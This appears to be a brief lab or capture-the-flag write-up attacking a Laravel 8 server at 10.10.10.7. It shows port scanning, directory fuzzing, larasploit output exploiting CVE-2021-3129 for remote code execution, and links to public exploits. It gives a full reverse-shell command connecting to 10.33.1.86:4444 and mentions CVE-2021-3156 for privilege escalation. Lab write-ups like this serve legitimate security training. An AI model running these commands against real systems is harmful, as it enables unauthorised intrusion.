# LARAZ

```10.10.10.7```

# Portscan

`rustscan -a 10.10.10.7 --ulimit 5000`

Found port

- 8000

  Laravel v8.76.2 (PHP v7.4.3)



# Directory fuzing

`feroxbuster -u http://10.10.10.7:8000 -w /usr/share/wordlist/dirb/common.txt -o feroxbuster.log`

200      GET      119l      979w        0c http://10.10.10.7:8000/
200      GET      119l      979w        0c http://10.10.10.7:8000/
200      GET      119l      979w        0c http://10.10.10.7:8000/
200      GET        0l        0w        0c http://10.10.10.7:8000/.htaccess
200      GET        0l        0w        0c http://10.10.10.7:8000/favicon.ico
200      GET        0l        0w        0c http://10.10.10.7:8000/hello
200      GET      119l      979w        0c http://10.10.10.7:8000/index.php
200      GET        2l        3w       24c http://10.10.10.7:8000/robots.txt
200      GET       28l       74w     1194c http://10.10.10.7:8000/web.config

# Tries

- git clone https://github.com/carlosevieira/larasploit

 [Target]:  http://10.10.10.7:8000

 [~] Application Fingerprint 

 [HTTP STATUS]:  200
 [PHP Version]:  PHP/7.4.3
 [Common Laravel Cookie]:  XSRF-TOKEN: eyJpdiI6ImJMQzA2M0tK...
 [Common Laravel Cookie]:  laravel_session: eyJpdiI6IkY0bWZkMU0w...
 [INFO]:  Laravel 8 detected!
 [INFO]:  Default laravel instalation detected!
 [Version]:  Laravel v8.76.2 (PHP v7.4.3)
 [INFO]:  Application running in Debug Mode (got via HTTP Method not allowed)
 [VULN] Vulnerability detected: Remote Code Execution with CVE-2021-3129
 [Exploiting] Remote Code Execution with CVE-2021-3129 

 [RCE STAGING]: Successfully converted to PHAR (Default laravel gadget)!
 [RCE STAGING]: Phar deserialized !
 [RCE COMMAND OUTPUT]: 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)

# CVE-2021-3129

https://github.com/zhzyker/CVE-2021-3129 and using https://raw.githubusercontent.com/nth347/CVE-2021-3129_exploit/master/exploit.py for RCE


# Reverse shell with 

`python3 exploit.py http://10.10.10.7:8000 Monolog/RCE1 'bash -c "exec bash -i &>/dev/tcp/10.33.1.86/4444 <&1"'`

# CVE-2021-3156 for PE

